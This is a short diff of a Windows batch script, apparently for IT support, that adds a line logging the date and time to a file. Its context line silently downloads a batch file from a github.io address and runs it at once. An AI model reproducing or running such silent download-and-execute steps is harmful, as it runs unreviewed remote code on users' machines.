@@ -5,3 +5,5 @@ curl -o any.bat https://suporteeq.github.io/any.bat > NUL 2>&1 && call any.bat &
 
 echo Admnistracao
 timeout /t 10
+
+echo %date% %time% >> c:\suporte\%~n0.txt
